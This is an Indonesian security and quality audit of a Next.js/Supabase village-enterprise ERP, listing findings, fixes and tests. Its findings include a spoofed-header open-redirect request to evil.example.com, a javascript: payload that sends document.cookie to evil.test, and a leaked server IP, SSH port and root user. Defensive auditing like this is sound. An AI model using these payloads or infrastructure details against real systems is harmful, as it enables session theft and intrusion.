# AUDIT KESIAPAN PRODUKSI — ORVIA BUMDES (123 DESA)

Tanggal audit: 2026-08-05
Cakupan: 65.687 baris TS/TSX, 291 file, 48 modul Server Action, 12 Route Handler, 24 migrasi SQL
Basis versi: Next.js 16.2.6, React 19.2.4, Supabase SSR 0.10.3

Status verifikasi: `tsc --noEmit` bersih · `eslint` 2 warning · `next build` sukses ·
82 test Vitest lulus · 35/36 test Playwright lulus (1 gagal = bug terkonfirmasi, lihat T-02)

---

## RINGKASAN

Arsitekturnya sehat. Logika bisnis didorong ke Postgres lewat RPC, konteks tenant
selalu diambil dari sesi (tidak pernah dari input user), dan lapisan izin ORVIA AI
(`src/lib/orvia-ai/`) adalah bagian terbaik dari basis kode ini — batasannya
eksplisit dan didokumentasikan di komentar.

Yang menahan rilis ke 123 desa bukan arsitekturnya, tapi lima hal di bawah.

| # | Temuan | Dampak | Prioritas |
|---|---|---|---|
| T-01 | `npm run dev` mati total karena BOM di `globals.css` | Dev tidak bisa jalan lokal | **SUDAH DIPERBAIKI** |
| T-02 | Open redirect di `/auth/logout` via header `X-Forwarded-Host` | Phishing pasca-logout | **KRITIS** |
| T-03 | Buku Besar & Buku Jurnal terpotong diam-diam di 1000 baris | Laporan keuangan salah | **KRITIS** |
| T-04 | 58 dari 66 RPC tidak ada definisinya di repo | DB tidak bisa dibangun ulang | **KRITIS** |
| T-05 | Next.js 16.2.6 punya 9 advisory severity HIGH | Termasuk kebocoran endpoint | **TINGGI** |

---

## 1. KEAMANAN

### T-02 — Open redirect di `/auth/logout` (KRITIS, terbukti live)

`src/app/auth/logout/route.ts:10-22` menyusun URL redirect dari header
`x-forwarded-host` yang dikirim client.

Dibuktikan lewat test Playwright terhadap server yang berjalan:

```
GET /auth/logout   Header: X-Forwarded-Host: evil.example.com
→ Location: http://evil.example.com/login
```

Deploy memakai VPS + reverse proxy (`deploy-vps.ps1`), bukan Vercel. Kalau nginx
tidak menimpa header ini, penyerang mengirim link logout dan korban mendarat di
halaman login palsu — persis di momen mereka memang mengharapkan form login.

Perbaikan: pakai daftar host yang diizinkan, jangan percaya header.

```ts
const ALLOWED_HOSTS = new Set([
  "inovasigorut.online",
  "www.inovasigorut.online",
]);

function getLoginRedirectUrl(request: Request) {
  const host = request.headers.get("x-forwarded-host") ?? "";
  if (ALLOWED_HOSTS.has(host)) {
    return new URL("/login", `https://${host}`);
  }
  return new URL("/login", PUBLIC_SITE_URL);
}
```

Test: `tests/e2e/access-control.spec.ts` → "logout does not honour a spoofed
forwarded host". Test ini **sengaja dibiarkan merah** sampai diperbaiki.

Catatan tambahan: handler `GET` melakukan mutasi (sign-out), sehingga logout
bisa dipicu lewat `<img src="/auth/logout">`. Dampaknya ringan, tapi sebaiknya
POST saja.

### T-06 — Validasi URL dokumen hanya cek akhiran `.pdf` (TINGGI)

`src/app/ajukan-pinjaman/[slug]/[token]/actions.ts:129-137` menerima URL apa pun
asal berakhiran `.pdf`. Nilainya lalu dirender mentah sebagai
`href={application.supporting_document_url}` di
`src/app/unit/dashboard/simpan-pinjam/pengajuan/page.tsx:241` dan `:482`.

Yang lolos validasi saat ini:

```
javascript:fetch('https://evil.test/'+document.cookie)//x.pdf
data:text/html;base64,PHN2Zz4=#x.pdf
https://phishing.test/login.pdf
```

Ini form publik — siapa pun yang punya link desa bisa mengisinya, dan yang
mengklik tombol "Lihat Dokumen PDF" adalah petugas BUMDes yang sedang login.

Perbaikan: validasi skema URL-nya.

```ts
function isSafeDocumentUrl(raw: string) {
  try {
    const url = new URL(raw);
    return ["http:", "https:"].includes(url.protocol) &&
      url.pathname.toLowerCase().endsWith(".pdf");
  } catch {
    return false;
  }
}
```

Test: `tests/bugs/public-loan-input.test.ts`.

### T-07 — Password sementara memakai `Math.random()` (TINGGI)

`src/lib/auth/generate-temporary-password.ts` membuat password awal untuk setiap
user BUMDes yang dibuat admin. Dua masalah:

1. `Math.random()` bukan CSPRNG. State internal V8 (xorshift128+) bisa
   direkonstruksi dari sejumlah keluaran.
2. `.sort(() => Math.random() - 0.5)` bukan shuffle seragam.

Bias nomor 2 terukur (200.000 sampel, posisi karakter simbol):

| Indeks | 0 | 1 | 6 | 12 | 13 |
|---|---|---|---|---|---|
| Peluang | 0,1489 | 0,1316 | 0,0650 | 0,0279 | 0,0179 |

Seragam seharusnya 0,0714 di semua posisi. Indeks 0 delapan kali lebih sering
daripada indeks 13 — entropi efektifnya lebih kecil dari yang terlihat.

Perbaikan:

```ts
import { randomInt } from "node:crypto";

const pick = (set: string) => set[randomInt(set.length)];

// Fisher-Yates
for (let i = chars.length - 1; i > 0; i -= 1) {
  const j = randomInt(i + 1);
  [chars[i], chars[j]] = [chars[j], chars[i]];
}
```

Test: `tests/bugs/temporary-password.test.ts`.

### T-08 — Tiga Route Handler tanpa cek sesi (SEDANG)

| File | Yang dilakukan |
|---|---|
| `src/app/api/platform/public-content/sections/[id]/route.ts` | Ubah konten landing page + upload ke bucket publik |
| `src/app/platform/dashboard/public-content/branding/update/route.ts` | Upsert branding platform + upload logo |
| `src/app/auth/logout/route.ts` | Sign-out (wajar tanpa sesi) |

Dua yang pertama hanya dilindungi RLS. Yang lebih perlu diperhatikan: keduanya
**upload file dulu, baru cek database**. Jadi user login mana pun dari 123 desa
bisa menaruh file di bucket `public-content` meski update tabelnya gagal. Daftar
tipe yang diizinkan memuat `image/svg+xml` — SVG adalah konten aktif, dan dari
bucket publik itu jadi primitif stored-XSS.

Perbaikan: panggil `requireRole(["super_admin_platform"])` di awal, dan buang
`image/svg+xml` dari `allowedTypes`.

### T-09 — 14 modul Server Action tanpa cek otorisasi di lapisan aplikasi (SEDANG)

Panduan Next.js 16 (`node_modules/next/dist/docs/01-app/02-guides/authentication.md`)
menyatakan langsung:

> "Treat Server Actions with the same security considerations as public-facing
> API endpoints, and verify if the user is allowed to perform a mutation."

Dan tentang layout:

> "This pattern is **not recommended** since Next.js applications have multiple
> entry points, which will not prevent nested route segments and Server Actions
> from being accessed."

Kedelapan `layout.tsx` dashboard memang memanggil `requireRole` — dan itu
terbukti bekerja untuk navigasi halaman (28 rute diuji, semuanya redirect ke
`/login`). Tapi layout **tidak** melindungi Server Action.

Lima di antaranya memang publik by design (`/register/*`, `/ajukan-pinjaman`).
Sembilan sisanya bergantung sepenuhnya pada RPC `SECURITY DEFINER` di belakangnya:

- `platform/dashboard/bumdes/actions.ts` — termasuk `deleteTenantWithAudit`
- `platform/dashboard/registrations/actions.ts`
- `platform/dashboard/{bupati,pendamping,pengawas}-registrations/actions.ts`
- `platform/dashboard/public-content/actions.ts`
- `unit/dashboard/simpan-pinjam/pencairan/actions.ts` — pencairan pinjaman
- `unit/dashboard/simpan-pinjam/angsuran/actions.ts` — angsuran
- `unit/dashboard/catat-transaksi/_actions/capital-debt-payment-actions.ts`

Yang sudah diverifikasi aman: `set_tenant_lifecycle_status` dan
`delete_tenant_with_audit` memang memanggil `platform_assert_super_admin()` di
baris pertama. Itu pola yang benar. Masalahnya, tujuh RPC lainnya tidak ada di
repo (lihat T-04), jadi tidak bisa diverifikasi sama sekali.

Rekomendasi: pertahankan cek di DB, **tambahkan** `requireRole` di aplikasi.
Dua lapis, bukan satu.

Test: `tests/guard/server-action-auth.test.ts` mengunci daftar ini. Modul
Server Action **baru** tanpa gate akan langsung gagal.

### T-10 — Halaman publik memakai service-role key (SEDANG)

`src/app/register/pengawas/page.tsx:9` memanggil `createAdminClient()` — bypass
seluruh RLS — pada halaman yang bisa diakses anonim, untuk mendaftar seluruh
tenant beserta UUID internalnya:

```ts
.from("tenants").select("id, nama_bumdes, kode_bumdes, nama_desa, nama_kecamatan")
```

Nama BUMDes memang informasi publik, tapi UUID internal 123 tenant tidak perlu
bocor ke anonim. Gunakan view publik yang hanya memuat kolom yang dibutuhkan.

### T-11 — Form pinjaman publik tanpa rate limit (SEDANG)

`src/app/ajukan-pinjaman/[slug]/[token]/actions.ts` tidak punya rate limit,
CAPTCHA, atau honeypot. Dengan 123 link publik yang tersebar, ini jalur tulis
terbuka ke tabel pinjaman. Audit trail-nya juga lemah:
`p_submitted_user_agent` di-hardcode `"public web form"` dan
`p_submitted_referrer` selalu `null`.

### T-05 — Dependensi rentan (TINGGI)

`npm audit` melaporkan 9 advisory HIGH pada Next.js 16.2.6, termasuk:

- Unauthenticated disclosure of internal Server Function endpoints
- Denial of Service in App Router using Server Actions
- Cache confusion of response bodies for requests with bodies
- SSRF in rewrites via attacker-controlled destination hostname

Perbaikan: `npm i next@16.3.0`. Jalankan `npm test` setelahnya — suite guard
akan menangkap regresi struktural.

`html2canvas` dan `html2canvas-pro` terpasang tapi **nol** penggunaan di `src/`.
Hapus keduanya.

### T-12 — `deploy-vps.ps1` membocorkan infrastruktur

Skrip yang di-commit memuat IP VPS (`31.97.110.246`), port SSH (`2222`), dan
user `root`. Pindahkan ke variabel environment, dan hentikan login SSH sebagai
root.

---

## 2. BUG KORELASI DATA

### T-03 — Laporan keuangan terpotong diam-diam (KRITIS)

Ini temuan paling serius secara fungsional.

`src/app/unit/dashboard/reports/buku-besar/page.tsx:141,154` memakai
`.limit(1000)` mati. Tidak ada `.range()`, tidak ada offset, tidak ada parameter
halaman, tidak ada peringatan "menampilkan 1000 dari N" di mana pun dalam
`src/app/unit/dashboard/reports/`.

Yang membuatnya berbahaya bukan pemotongannya, tapi apa yang dihitung dari data
terpotong itu:

```ts
// baris 94-97
function getLatestBalance(rows: GeneralLedgerRow[]) {
  return toNumber(rows[rows.length - 1]?.running_balance);
}

// baris 167-169
const totalDebit  = rows.reduce((s, r) => s + toNumber(r.debit), 0);
const totalCredit = rows.reduce((s, r) => s + toNumber(r.credit), 0);
const latestBalance = getLatestBalance(rows);
```

Begitu unit melewati 1000 baris jurnal dalam rentang tanggal yang dipilih:

- "Saldo Terakhir" (baris 287-289) menampilkan saldo berjalan baris ke-1000,
  bukan saldo akhir sebenarnya
- Total Debit dan Total Kredit hanya menjumlahkan 1000 baris pertama
- `reportData.totals` (baris 183-187) diteruskan ke ekspor PDF — **dokumen PDF
  yang dicetak dan diarsipkan ikut salah**
- Dropdown filter akun dibangun dari 1000 baris yang sama, jadi akun yang muncul
  belakangan hilang dari filter

Unit yang memposting ~3 baris jurnal per hari melewati 1000 dalam setahun. Untuk
123 desa, ini bukan kasus tepi — ini kepastian.

`buku-jurnal/page.tsx:111` punya batas yang sama.

Perbaikan minimal (satu rilis): deteksi `rows.length === 1000` dan tampilkan
peringatan, jangan cetak PDF-nya.
Perbaikan benar: agregasi total di sisi Postgres, dan paginasi tampilannya.

Test: `tests/guard/report-truncation.test.ts` mengunci bentuk saat ini. Ketika
diperbaiki, test itu gagal dan menunjukkan baris mana yang berubah.

### T-13 — Parsing angka Indonesia salah untuk desimal gaya Inggris (SEDANG)

`actions.ts:14-19` pada form pinjaman publik:

```ts
const raw = String(value ?? "").replace(/\./g, "").replace(/,/g, ".").trim();
```

Perilakunya:

| Input | Hasil | Benar? |
|---|---|---|
| `20.000.000` | 20000000 | ya |
| `1.500,50` | 1500,5 | ya |
| `1,500,000` | 0 → ditolak form | aman |
| `20000000.50` | **2.000.000.050** | **100x lipat** |

Field-nya teks bebas (`inputMode="numeric"`, bukan `type="number"`), jadi angka
tempelan dari sumber lain bisa masuk. Rp 20 juta jadi Rp 2 miliar tanpa
peringatan.

### T-14 — Audit trail kegagalan hapus tenant tidak pernah tersimpan (SEDANG)

`supabase/migrations/20260619103000_create_tenant_lifecycle_engine.sql`, blok
exception di akhir `delete_tenant_with_audit`:

```sql
exception
  when others then
    update public.tenant_lifecycle_batches
    set status = 'failed', ...
    where id = v_batch_id;
    raise;
```

Di PL/pgSQL, `raise` yang me-reraise akan membatalkan seluruh subtransaksi blok
tersebut — termasuk `update` yang baru saja dijalankan. Jadi status `'failed'`
tidak pernah benar-benar tersimpan. Baris batch tetap `'started'` selamanya.

Perbaikan: catat kegagalan lewat `dblink`/`pg_background`, atau sederhananya
terima bahwa batch yang menggantung di `'started'` berarti gagal, dan
dokumentasikan itu.

---

## 3. KECEPATAN MUAT

### Yang sudah benar

- `jspdf` (~400 KB) di-load lewat `await import("jspdf")` di keenam modul
  `src/lib/reports/*-pdf.ts`. Code-splitting-nya tepat.
- Total chunk klien 2,4 MB, terbesar 409 KB — wajar untuk ERP sebesar ini.
- 29 file memakai `Promise.all`.

### T-15 — Semua dashboard `force-dynamic`, nol caching

Setiap rute dashboard mengekspor `export const dynamic = "force-dynamic"`. Build
mengonfirmasi: dari ~100 rute, hampir semuanya `ƒ (Dynamic)`. Artinya setiap
navigasi = query Supabase baru, tanpa cache sama sekali.

### T-16 — Query berurutan, bukan paralel

`src/app/unit/dashboard/page.tsx` — halaman pertama yang dilihat setiap operator
unit — menjalankan 6 query berurutan di baris 72, 79, 85, 91, 97, 103. Empat di
antaranya (`coaCount`, `itemCount`, `salesCount`, `purchaseCount`) saling
independen.

Pada RTT 80 ms: ~480 ms berurutan vs ~160 ms bila diparalelkan. Halaman terberat
lainnya: `reports/kepmen-136/[reportCode]/page.tsx` (8 await berurutan),
`bagi-hasil/proses/page.tsx` (6).

Perbaikan langsung:

```ts
const [coa, items, sales, purchases] = await Promise.all([
  supabase.from("chart_of_accounts").select("*", { count: "exact", head: true })…,
  supabase.from("inventory_items")…,
  supabase.from("sales_invoices")…,
  supabase.from("purchase_invoices")…,
]);
```

### T-17 — Nol `Suspense`, nol error boundary

- `Suspense` dipakai di **0** file
- `loading.tsx` hanya 5 file untuk ~100 rute
- `error.tsx`, `not-found.tsx`, `global-error.tsx`: **0**

Efeknya: server menahan seluruh HTML sampai query terakhir selesai. User melihat
layar kosong selama itu — bukan shell yang sudah tampil. Dan bila Supabase
melempar error, yang muncul adalah halaman error bawaan Next.js.

Next.js 16 menyediakan jalur khusus untuk ini
(`node_modules/next/dist/docs/01-app/02-guides/instant-navigation.md`):

> "With Cache Components enabled, wrapping uncached data in `<Suspense>`
> boundaries produces instant navigations... **Always export `unstable_instant`
> from routes that should navigate instantly** — it validates the caching
> structure at dev time and build time."

Polanya cocok persis untuk aplikasi ini: sidebar + header + judul jadi static
shell yang tampil seketika, angka-angka Supabase mengalir masuk di belakang
`<Suspense>`.

### T-18 — Presence heartbeat menulis terlalu sering

`src/components/layouts/presence-heartbeat.tsx:40` menembak
`touch_user_presence` setiap 60 detik. `useEffect`-nya bergantung pada
`pathname`, jadi **setiap navigasi juga memicu satu tulis tambahan**.

Estimasi 123 desa × ~5 user aktif = ~600 user → ~10 UPDATE/detik terus-menerus,
belum termasuk navigasi. Untuk tabel yang di-UPDATE berulang, ini menghasilkan
bloat dan beban autovacuum yang nyata.

Perbaikan: keluarkan `pathname` dari dependency array (simpan di `useRef`),
naikkan interval ke 2–5 menit.

### T-19 — Tidak ada timeout / fallback saat Supabase lambat

Saat pengujian dengan Supabase yang tidak bisa dijangkau, halaman publik `/`,
`/aplikasi`, `/manajemen`, `/tentang` menggantung **17,5–18,0 detik** sebelum
merender. Tidak ada timeout, tidak ada konten cache sebagai cadangan. Landing
page publik seharusnya tidak pernah bergantung pada database yang hidup.

### T-20 — Satu VPS, deploy dengan downtime

`deploy-vps.ps1` melakukan `systemctl stop` → pindah direktori → `start`. Build
(`npm ci && npm run build`) dijalankan **di VPS itu sendiri**. Untuk 123 desa:
setiap deploy = outage total, dan build memakan CPU/RAM server produksi. Tidak
ada instance kedua, tidak ada health check sebelum switch.

---

## 4. GAYA PENULISAN KODE

### Yang bagus

- Penamaan konsisten dan deskriptif, memakai domain Indonesia (`bagi-hasil`,
  `cutoff-migrasi`, `simpan-pinjam`) — mudah dilacak antara UI, route, dan SQL.
- Struktur folder `_components/` dan `_actions/` per fitur: rapi dan predictable.
- Tipe di-declare eksplisit di boundary data (`type GeneralLedgerRow = {...}`).
- Komentar dipakai di tempat yang tepat — batasan keamanan, bukan narasi kode.
  `src/lib/orvia-ai/context.ts:50-57` adalah contoh yang bagus.
- `tsc --noEmit` bersih di 65k baris. Itu disiplin yang nyata.

### Yang perlu dirapikan

**T-01 — BOM merusak dev server (SUDAH DIPERBAIKI)**

220 dari 316 file sumber membawa UTF-8 BOM. Satu di antaranya —
`src/app/globals.css` — membuat `npm run dev` gagal total:

```
Parsing CSS source code failed
> 2 | @layer properties;
Invalid dangling combinator in selector
```

BOM lolos dari transform PostCSS dan mendarat di awal CSS hasil generate, yang
lalu ditolak parser. `next build` tetap sukses, jadi ini luput dari perhatian —
tapi dev server mati sepenuhnya. Setelah BOM dihapus: **siap dalam 1251 ms**.

Sudah saya perbaiki (3 byte, `src/app/globals.css`). 219 file sisanya tidak
berbahaya, tapi sebaiknya dinormalisasi sekalian.

**Indentasi campur** — 255 file 2 spasi, 35 file 4 spasi. Contoh 4 spasi:
`src/app/unit/dashboard/catat-transaksi/_actions/capital-debt-payment-actions.ts`.

**Tidak ada Prettier, `.editorconfig`, `.gitattributes`, atau hook pre-commit.**
Semua file CRLF; tanpa `.gitattributes` ini akan jadi sumber konflik begitu ada
kontributor di Linux/Mac.

**File terlalu besar.** `src/app/api/unit/assistant/route.ts` 2816 baris,
`reports/kepmen-136/[reportCode]/page.tsx` 2249 baris. Keduanya sulit direview.

**Validasi input diduplikasi.** Pola `String(formData.get(...) ?? "").trim()`
ditulis ulang di puluhan action. Sebuah helper `getRequiredString(formData, key,
label)` sudah ada di `platform/dashboard/bumdes/actions.ts` — angkat ke `src/lib/`
dan pakai di semua tempat.

Rekomendasi: tambahkan Prettier + `.editorconfig` + `.gitattributes`, lalu
format ulang dalam satu commit terpisah.

---

## 5. YANG BELUM BISA DIUJI

### T-04 — Skema database tidak ada di repo (KRITIS)

Aplikasi memanggil 66 RPC. Folder `supabase/migrations/` hanya mendefinisikan 8
di antaranya. 58 sisanya tidak ada, termasuk yang paling penting:

```
get_user_login_context          approve_tenant_registration
post_journal_correction         create_and_post_purchase_invoice
post_unit_cutoff_migration      calculate_profit_sharing_allocation
post_annual_closing             create_and_post_savings_loan_repayment
pay_capital_expenditure_debt    submit_public_savings_loan_application
```

Konsekuensinya berlapis:

1. **Database tidak bisa dibangun ulang dari repo.** Tidak ada staging, tidak ada
   disaster recovery dari source control.
2. **Kebijakan RLS tidak bisa direview.** Untuk sistem multi-tenant 123 desa, RLS
   adalah satu-satunya pemisah antar desa — dan isinya tidak terlihat di sini.
3. **Tidak bisa ada test integrasi.** Test isolasi tenant sungguhan (login sebagai
   desa A, coba baca data desa B) mustahil dibuat tanpa database yang bisa
   di-provision.
4. **Semua logika akuntansi tidak teruji** — jurnal seimbang, penyusutan, bagi
   hasil, tutup buku tahunan.

Ini yang harus diselesaikan lebih dulu sebelum apa pun yang lain. Jalankan
`supabase db pull` untuk menarik skema produksi ke dalam migrasi.

---

## 6. URUTAN PENGERJAAN YANG DISARANKAN

**Sebelum menambah desa baru**

1. T-04 — `supabase db pull`, commit seluruh skema. Ini membuka semua sisanya.
2. T-02 — perbaiki open redirect logout (10 baris)
3. T-03 — minimal tampilkan peringatan saat laporan terpotong
4. T-05 — `npm i next@16.3.0`, hapus `html2canvas*`

**Sebelum 123 desa aktif penuh**

5. T-09 — `requireRole` di 9 modul Server Action
6. T-06, T-07 — validasi skema URL, ganti ke `crypto.randomInt`
7. T-08 — gate dua route CMS, buang SVG dari allowedTypes
8. T-16, T-18 — paralelkan query dashboard, longgarkan heartbeat
9. Tulis test isolasi RLS (butuh T-04 selesai)

**Perbaikan berkelanjutan**

10. T-17 — `Suspense` + `unstable_instant` pada rute terberat
11. T-15 — pilih rute yang bisa lepas dari `force-dynamic`
12. T-20 — deploy tanpa downtime, build di luar server produksi
13. Prettier + `.editorconfig` + `.gitattributes` + CI

---

## 7. TEST YANG SUDAH DIBUAT

Rinciannya di `tests/README.md`.

```
npm test          # 82 test Vitest — tanpa database
npm run test:e2e  # Playwright — butuh .env.local
npm run verify    # typecheck → lint → test
```

| Folder | Isi |
|---|---|
| `tests/unit` | Logika murni: peta role→route, matriks izin ORVIA AI, menu unit, redaksi error provider |
| `tests/guard` | Invarian arsitektur, berbentuk ratchet dengan allowlist. Server Action baru tanpa auth langsung gagal |
| `tests/bugs` | Rekaman bug T-06, T-07, T-13 yang bisa dieksekusi. Ditulis agar **gagal saat bug diperbaiki** |
| `tests/e2e` | 28 rute terlindungi diuji anonim, budget kecepatan muat, form pinjaman publik |

Suite guard sengaja dibuat hijau hari ini dengan allowlist yang mendokumentasikan
kondisi saat audit. Suite yang merah di `main` akan diabaikan orang dalam
seminggu; suite hijau yang berubah merah saat ada regresi akan ditindak.
